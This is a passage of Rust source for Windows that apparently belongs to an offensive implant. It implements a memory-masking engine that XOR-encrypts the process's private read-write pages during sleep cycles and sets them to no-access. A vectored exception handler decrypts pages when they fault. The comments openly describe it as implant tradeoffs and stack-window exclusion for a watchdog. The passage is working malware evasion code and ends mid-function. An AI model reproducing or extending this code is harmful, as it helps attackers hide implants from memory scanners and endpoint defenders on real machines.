#![allow(unsafe_op_in_unsafe_fn)]

use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, AtomicPtr, AtomicU8, AtomicUsize, Ordering};

use windows_sys::Win32::Foundation::{
    CloseHandle, EXCEPTION_ACCESS_VIOLATION, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH,
    EXCEPTION_POINTERS,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
};
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_PRIVATE, MEM_RELEASE, MEM_RESERVE, PAGE_GUARD, PAGE_NOACCESS, PAGE_READWRITE,
    VirtualAlloc, VirtualFree, VirtualProtect, VirtualQuery,
};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcessId, OpenThread, Sleep, THREAD_QUERY_INFORMATION,
};
// Only needed by the non-x64 fallback of `current_thread_key`; on x64 the TEB
// pointer is read from `gs` directly, so this import is gated to avoid an unused
// import there.
#[cfg(not(target_arch = "x86_64"))]
use windows_sys::Win32::System::Threading::GetCurrentThreadId;

const PAGE_SIZE: usize = 4096;
const XOR_KEY: u8 = 0x69;
const WALK_START: usize = 0x1_0000;
const MAX_SKIP: usize = 1024;
const CAPACITY_MARGIN: usize = 256;
const THREAD_BASIC_INFORMATION_CLASS: u32 = 0;
const TLS_EXPANSION_SLOTS_OFFSET: usize = 0x1780;

// Per-entry page state (stored as `AtomicU8` in `PageEntry`). Ownership is taken
// by CAS so the VEH and the watchdog bulk-decrypt can never both operate on the
// same page, eliminating the double-XOR under any interleaving.
const PG_ENCRYPTED: u8 = 0; // ciphertext + PAGE_NOACCESS (the only state a fault can claim)
const PG_BUSY: u8 = 1; // claimed by exactly one actor, mid-decrypt
const PG_PLAINTEXT: u8 = 2; // decrypted and usable

// Number of tid-keyed recursion-guard slots in the unencrypted state region.
const RECURSION_SLOTS: usize = 32;

// VEH return codes (mirrors the windows-sys EXCEPTION_* constants we import).
const VEH_ACCESS_VIOLATION: i32 = EXCEPTION_ACCESS_VIOLATION;
const VEH_CONTINUE_EXECUTION: i32 = EXCEPTION_CONTINUE_EXECUTION;
const VEH_CONTINUE_SEARCH: i32 = EXCEPTION_CONTINUE_SEARCH;

// Process-wide singleton guard: only one MemGuard may own an encrypted state
// region at a time, so instances never cross-encrypt each other's bookkeeping.
static LIVE: AtomicBool = AtomicBool::new(false);

// Process-wide pointer to the live engine state region. The VEH handler loads
// this atomically; it is null whenever no state region exists (no MemGuard is
// alive, or the region was released-on-drop). This is how the handler reaches
// the encrypted-page list and the tid-keyed recursion guard without touching
// TLS or the heap. The region itself is NEVER freed once a VEH could reference
// it (see `Drop`), so a handler that loaded STATE before a drop can never
// dereference freed memory.
static STATE: AtomicPtr<State> = AtomicPtr::new(core::ptr::null_mut());

// VEH handle returned by AddVectoredExceptionHandler, retained for the process
// lifetime (never removed — see review fix #2).
static VEH_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());

// Ensures AddVectoredExceptionHandler is invoked at most once per process. Set on
// the first successful init and never cleared (registration is process-lifetime).
static VEH_REGISTERED: AtomicBool = AtomicBool::new(false);

type NtQuerySystemInformationFn = extern "system" fn(u32, *mut c_void, u32, *mut u32) -> i32;
type NtQueryInformationThreadFn =
    extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;

unsafe extern "system" {
    fn GetModuleHandleW(lpModuleName: *const u16) -> *mut c_void;
    fn GetProcAddress(hModule: *mut c_void, lpProcName: *const u8) -> *mut c_void;
}

const NTDLL_W: &[u16] = &[110, 116, 100, 108, 108, 46, 100, 108, 108, 0];

#[repr(C)]
#[derive(Clone, Copy)]
struct SkipRange {
    base: *mut u8,
    len: usize,
}

#[repr(C)]
struct PageEntry {
    base: *mut u8,
    orig_protect: u32,
    // Per-entry page state (`PG_*` constants), atomic so the VEH and the
    // watchdog bulk-decrypt claim a page without a lock. Kept as an atomic
    // marker (never a base null-out) so the sorted-by-base list stays
    // binary-searchable. Both writers CAS PG_ENCRYPTED -> PG_BUSY before
    // touching the page and PG_BUSY -> PG_PLAINTEXT on completion; on an
    // initial VirtualProtect failure they CAS back to PG_ENCRYPTED so the page
    // is never left half-decrypted.
    state: AtomicU8,
}

#[repr(C)]
struct ThreadBasicInformation {
    exit_status: i32,
    teb_base: *mut c_void,
    unique_process: *mut c_void,
    unique_thread: *mut c_void,
    affinity_mask: usize,
    priority: i32,
    base_priority: i32,
}

#[repr(C)]
struct State {
    region_base: *mut u8,
    region_size: usize,
    capacity: usize,
    // Number of tracked (encrypted or claimed) pages. Atomic so the VEH can read
    // it without a lock; the watchdog is always suspended-relative to a faulting
    // thread, so a plain atomic load is race-free in practice (see the
    // concurrency note in `decrypt_page_for_fault_inner`).
    count: AtomicUsize,
    skip_static_count: usize,
    skip_count: usize,
    skip_failed: bool,
    // Resume point for the bulk decrypt (entries below are already plaintext).
    // Atomic for the same reason as `count`.
    decrypt_cursor: AtomicUsize,
    entries: *mut PageEntry,
    #[allow(dead_code)]
    nt_query_system_information: NtQuerySystemInformationFn,
    nt_query_information_thread: NtQueryInformationThreadFn,
    skip: [SkipRange; MAX_SKIP],
    // Tid-keyed recursion guard: fixed array of (thread-key, active) pairs used
    // to detect SAME-thread nested re-entry into the VEH without blocking
    // concurrent faults on *different* threads (which must each recover). The
    // thread key is the faulting thread's TEB pointer (read from the segment
    // register in `current_thread_key`), which is unique per live thread.
    recursion_tid: [usize; RECURSION_SLOTS],
    recursion_active: [bool; RECURSION_SLOTS],
}

pub struct MemGuard {
    state: *mut State,
}

impl MemGuard {
    pub fn new() -> Option<Self> {
        if LIVE
            .compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed)
            .is_err()
        {
            return None;
        }
        let ntdll = unsafe { GetModuleHandleW(NTDLL_W.as_ptr()) };
        if ntdll.is_null() {
            LIVE.store(false, Ordering::Release);
            return None;
        }
        let qsi = unsafe { GetProcAddress(ntdll, b"NtQuerySystemInformation\0".as_ptr()) };
        let qit = unsafe { GetProcAddress(ntdll, b"NtQueryInformationThread\0".as_ptr()) };
        if qsi.is_null() || qit.is_null() {
            LIVE.store(false, Ordering::Release);
            return None;
        }
        let nt_query_system_information: NtQuerySystemInformationFn =
            unsafe { core::mem::transmute(qsi) };
        let nt_query_information_thread: NtQueryInformationThreadFn =
            unsafe { core::mem::transmute(qit) };

        let mut static_skip: [SkipRange; MAX_SKIP] = [SkipRange {
            base: core::ptr::null_mut(),
            len: 0,
        }; MAX_SKIP];
        let mut static_skip_count: usize = 0;
        let skip_ok = unsafe {
            build_static_skip(
                &mut static_skip,
                &mut static_skip_count,
                nt_query_information_thread,
            )
        };
        if !skip_ok {
            LIVE.store(false, Ordering::Release);
            return None;
        }

        let page_count = unsafe { count_candidates(&static_skip, static_skip_count) };
        let capacity = page_count + CAPACITY_MARGIN;
        let header_offset = match unsafe {
            round_up(
                core::mem::size_of::<State>(),
                core::mem::align_of::<PageEntry>(),
            )
        } {
            Some(v) => v,
            None => {
                LIVE.store(false, Ordering::Release);
                return None;
            }
        };
        let region_bytes = match capacity.checked_mul(core::mem::size_of::<PageEntry>()) {
            Some(v) => v,
            None => {
                LIVE.store(false, Ordering::Release);
                return None;
            }
        };
        let region_size = match header_offset.checked_add(region_bytes) {
            Some(v) => v,
            None => {
                LIVE.store(false, Ordering::Release);
                return None;
            }
        };

        let region_base = unsafe {
            VirtualAlloc(
                core::ptr::null(),
                region_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            ) as *mut u8
        };
        if region_base.is_null() {
            LIVE.store(false, Ordering::Release);
            return None;
        }

        let entries = unsafe { region_base.add(header_offset) as *mut PageEntry };
        let skip_static_count = static_skip_count;

        unsafe {
            let state = region_base as *mut State;
            core::ptr::write(
                state,
                State {
                    region_base,
                    region_size,
                    capacity,
                    count: AtomicUsize::new(0),
                    skip_static_count,
                    skip_count: skip_static_count,
                    skip_failed: false,
                    decrypt_cursor: AtomicUsize::new(0),
                    entries,
                    nt_query_system_information,
                    nt_query_information_thread,
                    skip: static_skip,
                    recursion_tid: [0usize; RECURSION_SLOTS],
                    recursion_active: [false; RECURSION_SLOTS],
                },
            );
            let s = &mut *state;
            if !add_skip_region(&mut s.skip, &mut s.skip_count, region_base, region_size) {
                VirtualFree(region_base as *mut c_void, 0, MEM_RELEASE);
                LIVE.store(false, Ordering::Release);
                return None;
            }
            s.skip_static_count = s.skip_count;
        }

        // Publish the state region and register the VEH safety net exactly once
        // per process. STATE is set before registration so a fault that occurs
        // during a later phase of init can already be serviced.
        let state_ptr = region_base as *mut State;
        unsafe {
            STATE.store(state_ptr, Ordering::Release);
            if register_veh() {
                return Some(MemGuard { state: state_ptr });
            }
            // Registration failed (essentially never). Drop the live guard and
            // the global pointer. Per review fix #2 the region is retained for
            // the process lifetime regardless, so we do not VirtualFree it: no
            // VEH is registered yet (so no handler can reference it) and a later
            // re-init simply allocates a fresh region.
            STATE.store(core::ptr::null_mut(), Ordering::Release);
        }
        LIVE.store(false, Ordering::Release);
        None
    }

    pub fn encrypt(&mut self) -> bool {
        unsafe { encrypt_state(self.state) }
    }

    pub fn decrypt(&mut self) -> bool {
        unsafe { decrypt_state(self.state) }
    }

    pub fn add_exclusion(&mut self, base: *const u8, len: usize) -> bool {
        unsafe {
            let s = &mut *self.state;
            let ok = add_skip_region(&mut s.skip, &mut s.skip_count, base as *mut u8, len);
            if !ok {
                s.skip_failed = true;
            }
            ok
        }
    }

    pub fn clear_dynamic_exclusions(&mut self) {
        unsafe {
            let s = &mut *self.state;
            s.skip_count = s.skip_static_count;
            s.skip_failed = false;
        }
    }

    pub fn find_encrypted_page(&self, addr: *const u8) -> Option<usize> {
        unsafe {
            let s = &*self.state;
            let entries = s.entries;
            let page = (addr as usize & !(PAGE_SIZE - 1)) as *mut u8;
            let mut lo = 0usize;
            let mut hi = s.count.load(Ordering::Acquire);
            while lo < hi {
                let mid = lo + (hi - lo) / 2;
                let e = &*entries.add(mid);
                if e.base < page {
                    lo = mid + 1;
                } else if e.base > page {
                    hi = mid;
                } else {
                    return Some(mid);
                }
            }
            None
        }
    }

    pub fn encrypted_count(&self) -> usize {
        unsafe { (*self.state).count.load(Ordering::Acquire) }
    }
}

impl Drop for MemGuard {
    fn drop(&mut self) {
        unsafe {
            let s = &mut *self.state;
            if s.count.load(Ordering::Acquire) != 0 {
                decrypt_state(self.state);
            }
            if s.count.load(Ordering::Acquire) == 0 {
                // Fully decrypted. UNSAFE INVARIANT — process-lifetime region
                // retention (review fix #2): we deliberately NEVER VirtualFree
                // the state region and NEVER remove the VEH once registered. The
                // region is retained so any in-flight VEH handler that loaded
                // STATE before this drop can never dereference freed memory; a
                // few KB per MemGuard recreation is an accepted trade-off for an
                // implant. We only clear the live guard and the global pointer;
                // a later re-init re-points STATE at a fresh (leaked) region and
                // register_veh() is a no-op because VEH_REGISTERED stays set.
                STATE.store(core::ptr::null_mut(), Ordering::Release);
                LIVE.store(false, Ordering::Release);
            }
            // Otherwise decrypt failed and pages are still PAGE_NOACCESS. The
            // region is intentionally leaked (not freed) so the VEH can still
            // consult the page list, and LIVE stays set so no instance can be
            // created that would cross-encrypt this still-encrypted region.
        }
    }
}

unsafe fn round_up(value: usize, align: usize) -> Option<usize> {
    value.checked_add(align - 1).map(|x| x & !(align - 1))
}

unsafe fn add_skip_region(
    skip: &mut [SkipRange; MAX_SKIP],
    count: &mut usize,
    base: *mut u8,
    len: usize,
) -> bool {
    if *count < MAX_SKIP && len > 0 {
        skip[*count] = SkipRange { base, len };
        *count += 1;
        true
    } else {
        false
    }
}

unsafe fn is_excluded(skip: &[SkipRange], count: usize, page: *mut u8) -> bool {
    let p = page as usize;
    let pend = p.checked_add(PAGE_SIZE).unwrap_or(usize::MAX);
    for i in 0..count {
        let s = &skip[i];
        let sb = s.base as usize;
        let se = sb.checked_add(s.len).unwrap_or(usize::MAX);
        if p < se && sb < pend {
            return true;
        }
    }
    false
}

unsafe fn region_size_of(ptr: *mut c_void) -> usize {
    let mut mbi = core::mem::MaybeUninit::<
        windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION,
    >::uninit();
    let ret = VirtualQuery(
        ptr,
        mbi.as_mut_ptr(),
        core::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
    );
    if ret == 0 {
        0
    } else {
        mbi.assume_init().RegionSize
    }
}

unsafe fn virtual_walk(mut addr: usize, mut visit: impl FnMut(*mut u8, usize, u32, u32, u32)) {
    let mut mbi = core::mem::MaybeUninit::<
        windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION,
    >::uninit();
    loop {
        let ret = VirtualQuery(
            addr as *const c_void,
            mbi.as_mut_ptr(),
            core::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
        );
        if ret == 0 {
            break;
        }
        let mbi = mbi.assume_init();
        let base = mbi.BaseAddress as usize;
        let size = mbi.RegionSize;
        if base == 0 {
            break;
        }
        visit(base as *mut u8, size, mbi.State, mbi.Protect, mbi.Type);
        let next = base + size;
        if next <= addr {
            break;
        }
        addr = next;
    }
}

unsafe fn count_candidates(skip: &[SkipRange], skip_count: usize) -> usize {
    let mut count = 0usize;
    virtual_walk(WALK_START, |base, size, state, protect, ty| {
        if state == MEM_COMMIT
            && ty == MEM_PRIVATE
            && protect == PAGE_READWRITE
            && (protect & PAGE_GUARD) == 0
        {
            let mut p = base as usize;
            let end = p + size;
            while p + PAGE_SIZE <= end {
                let page = p as *mut u8;
                if !is_excluded(skip, skip_count, page) {
                    count += 1;
                }
                p += PAGE_SIZE;
            }
        }
    });
    count
}

unsafe fn build_static_skip(
    static_skip: &mut [SkipRange; MAX_SKIP],
    skip_count: &mut usize,
    nt_query_information_thread: NtQueryInformationThreadFn,
) -> bool {
    let pid = GetCurrentProcessId();
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == INVALID_HANDLE_VALUE {
        return false;
    }
    let mut te: THREADENTRY32 = core::mem::zeroed();
    te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    let mut ok = true;
    if Thread32First(snap, &mut te) != 0 {
        loop {
            if te.th32OwnerProcessID == pid
                && !add_thread_skip(
                    static_skip,
                    skip_count,
                    te.th32ThreadID,
                    nt_query_information_thread,
                )
            {
                ok = false;
            }
            if Thread32Next(snap, &mut te) == 0 {
                break;
            }
        }
    }
    CloseHandle(snap);
    ok
}

unsafe fn add_thread_skip(
    static_skip: &mut [SkipRange; MAX_SKIP],
    skip_count: &mut usize,
    tid: u32,
    nt_query_information_thread: NtQueryInformationThreadFn,
) -> bool {
    let h = OpenThread(THREAD_QUERY_INFORMATION, 0, tid);
    if h.is_null() {
        return false;
    }
    let mut tbi = core::mem::MaybeUninit::<ThreadBasicInformation>::uninit();
    let status = nt_query_information_thread(
        h,
        THREAD_BASIC_INFORMATION_CLASS,
        tbi.as_mut_ptr() as *mut c_void,
        core::mem::size_of::<ThreadBasicInformation>() as u32,
        core::ptr::null_mut(),
    );
    let mut ok = true;
    if status >= 0 {
        let tbi = tbi.assume_init();
        let teb = tbi.teb_base;
        if !teb.is_null() {
            let teb_size = region_size_of(teb);
            if !add_skip_region(static_skip, skip_count, teb as *mut u8, teb_size) {
                ok = false;
            }

            let peb = *(teb.add(0x60) as *const *mut c_void);
            if !peb.is_null() {
                let peb_size = region_size_of(peb);
                if !add_skip_region(static_skip, skip_count, peb as *mut u8, peb_size) {
                    ok = false;
                }
            }

            // NOTE: Phase 2 moves stack exclusion to the per-cycle path. The
            // watchdog excludes only the +-RSP_HOT_WINDOW_PAGES window around
            // each suspended thread's captured Rsp, so the rest of every stack
            // is now encrypted. Whole-stack exclusion here would prevent that,
            // so it is intentionally omitted from the static (init-time) skip.
            // The TEB, PEB, and TLS blocks below remain statically excluded.

            let tls = *(teb.add(0x58) as *const *mut c_void);
            if !tls.is_null() {
                let page = (tls as usize & !(PAGE_SIZE - 1)) as *mut u8;
                if !add_skip_region(static_skip, skip_count, page, PAGE_SIZE) {
                    ok = false;
                }
            }

            let tls_exp = *(teb.add(TLS_EXPANSION_SLOTS_OFFSET) as *const *mut c_void);
            if !tls_exp.is_null() {
                let tls_exp_size = region_size_of(tls_exp);
                if !add_skip_region(static_skip, skip_count, tls_exp as *mut u8, tls_exp_size) {
                    ok = false;
                }
            }
        }
    }
    CloseHandle(h);
    ok
}

unsafe fn encrypt_state(state: *mut State) -> bool {
    if (*state).count.load(Ordering::Acquire) != 0 || (*state).skip_failed {
        return false;
    }
    // A fresh cycle always starts from a clean decrypt cursor.
    (*state).decrypt_cursor.store(0, Ordering::Release);
    let capacity = (*state).capacity;
    let entries = (*state).entries;
    let mut failed = false;
    let mut stop = false;
    virtual_walk(WALK_START, |base, size, st, protect, ty| {
        if stop {
            return;
        }
        if st == MEM_COMMIT
            && ty == MEM_PRIVATE
            && protect == PAGE_READWRITE
            && (protect & PAGE_GUARD) == 0
        {
            let mut p = base as usize;
            let end = p + size;
            while p + PAGE_SIZE <= end {
                let page = p as *mut u8;
                let s = &*state;
                if is_excluded(&s.skip, s.skip_count, page) {
                    p += PAGE_SIZE;
                    continue;
                }
                let s = &mut *state;
                if s.count.load(Ordering::Relaxed) >= capacity {
                    failed = true;
                    stop = true;
                    break;
                }
                // Page is currently PAGE_READWRITE, so it can be mutated in place.
                let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
                for b in slice.iter_mut() {
                    *b ^= XOR_KEY;
                }
                let mut old = 0u32;
                if VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_NOACCESS, &mut old) != 0 {
                    let idx = s.count.load(Ordering::Relaxed);
                    let e = &mut *entries.add(idx);
                    e.base = page;
                    e.orig_protect = protect;
                    e.state = AtomicU8::new(PG_ENCRYPTED);
                    s.count.fetch_add(1, Ordering::Relaxed);
                } else {
                    // Protection failed: revert to plaintext and leave the page RW
                    // so it is never left holding ciphertext.
                    let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
                    for b in slice.iter_mut() {
                        *b ^= XOR_KEY;
                    }
                    failed = true;
                }
                p += PAGE_SIZE;
            }
        }
    });
    !failed
}

// Own and decrypt a single PG_ENCRYPTED page. Returns true if the page is now
// PG_PLAINTEXT (it was already, or we decrypted it). Returns false if a
// concurrent actor claimed it (now PG_BUSY) or it could not be made writable
// (still PG_ENCRYPTED). Callers re-classify a false result: PG_BUSY -> wait for
// the VEH owner; PG_ENCRYPTED -> fail-closed.
unsafe fn decrypt_one_owned(e: *mut PageEntry) -> bool {
    let cur = (*e).state.load(Ordering::Acquire);
    if cur == PG_PLAINTEXT {
        return true; // already decrypted; no-op.
    }
    if cur != PG_ENCRYPTED {
        return false; // PG_BUSY (or unexpected): not ours to claim now.
    }
    if (*e)
        .state
        .compare_exchange(PG_ENCRYPTED, PG_BUSY, Ordering::AcqRel, Ordering::Acquire)
        .is_err()
    {
        return false; // lost the race -> caller sees PG_BUSY.
    }
    let page = (*e).base;
    let orig_protect = (*e).orig_protect;
    let mut old = 0u32;
    if VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_READWRITE, &mut old) == 0 {
        (*e).state.store(PG_ENCRYPTED, Ordering::Release); // un-claim
        return false;
    }
    let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
    for b in slice.iter_mut() {
        *b ^= XOR_KEY;
    }
    if orig_protect != PAGE_READWRITE {
        // Usable plaintext; record it even if the exotic restore fails.
        let mut old = 0u32;
        if VirtualProtect(page as *const c_void, PAGE_SIZE, orig_protect, &mut old) == 0 {
            (*e).state.store(PG_PLAINTEXT, Ordering::Release);
            return true;
        }
    }
    (*e).state.store(PG_PLAINTEXT, Ordering::Release);
    true
}

unsafe fn decrypt_state(state: *mut State) -> bool {
    let entries = (*state).entries;
    let n = (*state).count.load(Ordering::Acquire);
    // Main pass: resume from the cursor and decrypt every PG_ENCRYPTED page,
    // advancing the cursor past already-plaintext / VEH-busy pages so a failed
    // pass can be retried without re-XORing plaintext.
    let mut i = (*state).decrypt_cursor.load(Ordering::Acquire);
    while i < n {
        let e = entries.add(i);
        let cur = (*e).state.load(Ordering::Acquire);
        if cur != PG_ENCRYPTED {
            // PG_PLAINTEXT (done) or PG_BUSY (VEH owner): skip, advance cursor.
            (*state).decrypt_cursor.store(i + 1, Ordering::Release);
            i += 1;
            continue;
        }
        if !decrypt_one_owned(e) {
            // decrypt_one_owned failed. If a concurrent VEH claimed this page
            // (now PG_BUSY) we skip and let the strict completion loop wait for
            // it; if it is still PG_ENCRYPTED and unwritable we fail-closed.
            if (*e).state.load(Ordering::Acquire) == PG_ENCRYPTED {
                (*state).decrypt_cursor.store(i, Ordering::Release);
                return false;
            }
            (*state).decrypt_cursor.store(i + 1, Ordering::Release);
            i += 1;
            continue;
        }
        (*state).decrypt_cursor.store(i + 1, Ordering::Release);
        i += 1;
    }

    // Strict completion (QA fix #1): certify ONLY when every entry in [0..count)
    // is PG_PLAINTEXT. Any PG_ENCRYPTED page (e.g. a VEH claimant that failed its
    // VirtualProtect and restored to PG_ENCRYPTED after the main pass) is
    // decrypted here so it is never orphaned with no bookkeeping. Any PG_BUSY
    // entry is a VEH owner still mid-recovery; we give it a bounded window
    // (~1s total) to finish before failing closed.
    const MAX_BUSY_WAIT_MS: u64 = 1000;
    const BUSY_BACKOFF_MS: u64 = 5;
    let mut waited_ms = 0u64;
    loop {
        let mut busy = false;
        for j in 0..n {
            let e = entries.add(j);
            match (*e).state.load(Ordering::Acquire) {
                PG_PLAINTEXT => {}
                PG_BUSY => busy = true,
                PG_ENCRYPTED => {
                    // Recover the orphaned / late page.
                    if !decrypt_one_owned(e) {
                        if (*e).state.load(Ordering::Acquire) == PG_ENCRYPTED {
                            return false; // unwritable -> fail-closed
                        }
                        busy = true; // became PG_BUSY under us -> wait
                    }
                }
                // Any other (unexpected) value: wait defensively.
                _ => busy = true,
            }
        }
        if !busy {
            break; // all entries PG_PLAINTEXT (any PG_ENCRYPTED were processed)
        }
        if waited_ms >= MAX_BUSY_WAIT_MS {
            return false; // stuck VEH owner -> never certify (fail-closed)
        }
        let backoff = BUSY_BACKOFF_MS.min(MAX_BUSY_WAIT_MS - waited_ms);
        Sleep(backoff as u32);
        waited_ms += backoff;
    }

    (*state).decrypt_cursor.store(0, Ordering::Release);
    (*state).count.store(0, Ordering::Release);
    true
}

// ---------------------------------------------------------------------------
// VEH decrypt-on-fault safety net.
//
// Registered once per process via AddVectoredExceptionHandler(1, handler) at the
// first successful MemGuard::new(). It is the tail-risk recovery path: if the
// watchdog dies mid-encrypt/decrypt (or foreign/injected code touches an
// encrypted page during the sleep window), the next fault on an encrypted page
// is lazily decrypted here so the process survives instead of tripping the
// unhandled-exception filter.
//
// HARD handler constraints (no allocation, no locks, no TLS, no panics,
// no loader/format/log): the handler works only over the unencrypted state
// region reached through the module-level `STATE` atomic pointer.
// ---------------------------------------------------------------------------

// Cheap, allocation-free current-thread key for the recursion guard. On x64 the
// TEB pointer is read straight out of the `gs` segment (user-mode TEB base) via
// a single `mov`; this is a plain memory read that does not touch TLS/heap. On
// other architectures we fall back to GetCurrentThreadId (also TLS-free).
#[cfg(target_arch = "x86_64")]
#[inline(always)]
unsafe fn current_thread_key() -> usize {
    let teb: usize;
    core::arch::asm!("mov {0}, gs:[0x30]", out(reg) teb, options(nostack));
    teb
}

#[cfg(not(target_arch = "x86_64"))]
#[inline(always)]
unsafe fn current_thread_key() -> usize {
    GetCurrentThreadId() as usize
}

const RECURSION_NESTED: i32 = -1;
const RECURSION_UNTRACKED: i32 = -2;

// Tid-keyed recursion guard. Detects SAME-thread nested re-entry into the VEH
// (returns RECURSION_NESTED so the handler returns CONTINUE_SEARCH) while
// admitting concurrent faults on DIFFERENT threads (each gets its own slot, so
// two threads faulting on two different encrypted pages both recover). The thread
// key is the faulting thread's TEB pointer, which is unique per live thread.
//
// UNSAFE INVARIANT - slot-exhaustion (proceed-untracked) is safe: if all slots
// are full we still admit the fault untracked (returning RECURSION_UNTRACKED). A
// nested re-entry on the SAME page self-protects via the per-page CAS - the entry
// is already PG_BUSY so the second claim misses and the handler returns
// CONTINUE_SEARCH (no corruption; the first/outer claim finishes it). A nested
// fault on a DIFFERENT page is recovered normally (fresh CAS claim). Recursion is
// bounded by the number of distinct encrypted pages, so it cannot spin unboundedly.
unsafe fn recursion_admit(state: *mut State, key: usize) -> i32 {
    for i in 0..RECURSION_SLOTS {
        let active = AtomicBool::from_ptr(core::ptr::addr_of_mut!((*state).recursion_active[i]));
        let tid = AtomicUsize::from_ptr(core::ptr::addr_of_mut!((*state).recursion_tid[i]));
        if active.load(Ordering::Acquire) && tid.load(Ordering::Acquire) == key {
            return RECURSION_NESTED;
        }
    }
    for i in 0..RECURSION_SLOTS {
        let active = AtomicBool::from_ptr(core::ptr::addr_of_mut!((*state).recursion_active[i]));
        let tid = AtomicUsize::from_ptr(core::ptr::addr_of_mut!((*state).recursion_tid[i]));
        if !active.load(Ordering::Acquire) && tid.load(Ordering::Acquire) == 0 {
            if tid
                .compare_exchange(0, key, Ordering::AcqRel, Ordering::Acquire)
                .is_ok()
            {
                active.store(true, Ordering::Release);
                return i as i32;
            }
        }
    }
    RECURSION_UNTRACKED // all slots full: admit untracked (see UNSAFE INVARIANT above)
}

unsafe fn recursion_release(state: *mut State, slot: i32) {
    if slot >= 0 {
        let i = slot as usize;
        let active = AtomicBool::from_ptr(core::ptr::addr_of_mut!((*state).recursion_active[i]));
        let tid = AtomicUsize::from_ptr(core::ptr::addr_of_mut!((*state).recursion_tid[i]));
        active.store(false, Ordering::Release);
        tid.store(0, Ordering::Release);
    }
}

unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    // Everything below is raw pointer work over the unencrypted state region;
    // no std/heap/TLS/locking is touched.
    if exception_info.is_null() {
        return VEH_CONTINUE_SEARCH;
    }
    let record = (*exception_info).ExceptionRecord;
    if record.is_null() {
        return VEH_CONTINUE_SEARCH;
    }
    // Only access violations are ours to consider.
    if (*record).ExceptionCode != VEH_ACCESS_VIOLATION {
        return VEH_CONTINUE_SEARCH;
    }
    // ExceptionInformation[1] is the faulting virtual address for an AV.
    let info = (*record).ExceptionInformation.as_ptr();
    let addr = *info.add(1);
    let state = STATE.load(Ordering::Acquire);
    if state.is_null() {
        return VEH_CONTINUE_SEARCH;
    }
    // Per-thread recursion guard: nested re-entry on the same thread returns
    // CONTINUE_SEARCH; concurrent faults on distinct threads each recover.
    let key = current_thread_key();
    let slot = recursion_admit(state, key);
    if slot == RECURSION_NESTED {
        return VEH_CONTINUE_SEARCH;
    }
    let ok = decrypt_page_for_fault(state, addr as *const u8);
    recursion_release(state, slot);
    if ok {
        VEH_CONTINUE_EXECUTION
    } else {
        VEH_CONTINUE_SEARCH
    }
}

// Decrypt a single faulting page. Returns true iff the page was ours and is now
// decrypted (caller should CONTINUE_EXECUTION).
unsafe fn decrypt_page_for_fault(state: *mut State, addr: *const u8) -> bool {
    // UNSAFE INVARIANT — VEH/engine concurrency:
    // The watchdog suspends all other threads during its bulk encrypt/decrypt
    // pass, so the only time a faulting (i.e. *running*) thread can invoke this
    // handler is when the watchdog is *not* mid-pass on that thread's pages —
    // either the watchdog is asleep (between cycles), or it has crashed. The
    // watchdog is therefore never a concurrent writer of `count`,
    // `decrypt_cursor`, or `entries` while a faulting thread reads them, AND the
    // per-entry CAS below makes the claim itself lock-free: both the VEH and the
    // watchdog CAS PG_ENCRYPTED->PG_BUSY before touching a page, so a page is
    // decrypted by exactly one actor. Plain atomic loads of `count`/
    // `decrypt_cursor` are hence safe without locks. The tid-keyed recursion
    // guard (in the handler) additionally lets concurrent faults on different
    // threads each proceed instead of serializing on a global flag.
    let cursor = (*state).decrypt_cursor.load(Ordering::Acquire);
    let count = (*state).count.load(Ordering::Acquire);
    if cursor >= count {
        return false;
    }
    let page = (addr as usize & !(PAGE_SIZE - 1)) as *mut u8;
    let entries = (*state).entries;
    // Binary search the sorted-by-base encrypted tail [cursor..count). The base
    // is never nulled (kept sorted) so the search stays correct; the page state
    // is tracked separately via the atomic `state` field.
    let mut lo = cursor;
    let mut hi = count;
    let mut found = usize::MAX;
    while lo < hi {
        let mid = lo + (hi - lo) / 2;
        let e = entries.add(mid);
        let b = (*e).base;
        if b < page {
            lo = mid + 1;
        } else if b > page {
            hi = mid;
        } else {
            found = mid;
            break;
        }
    }
    if found == usize::MAX {
        return false; // not one of our encrypted pages
    }
    let e = entries.add(found);
    let cur = (*e).state.load(Ordering::Acquire);
    if cur == PG_PLAINTEXT {
        // Already decrypted (e.g. by an earlier fault): the page is usable, so
        // report success and let the faulting instruction re-execute.
        return true;
    }
    if cur != PG_ENCRYPTED {
        return false; // PG_BUSY: claimed by a concurrent VEH; let it finish.
    }
    // Claim this page (lock-free). If a concurrent actor won the race, miss.
    if (*e)
        .state
        .compare_exchange(PG_ENCRYPTED, PG_BUSY, Ordering::AcqRel, Ordering::Acquire)
        .is_err()
    {
        return false;
    }
    let orig_protect = (*e).orig_protect;
    let mut old = 0u32;
    if VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_READWRITE, &mut old) == 0 {
        // Could not make the page writable: un-claim (back to encrypted) and
        // miss so the caller returns CONTINUE_SEARCH.
        (*e).state.store(PG_ENCRYPTED, Ordering::Release);
        return false;
    }
    // XOR back to plaintext (the key is its own inverse).
    let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
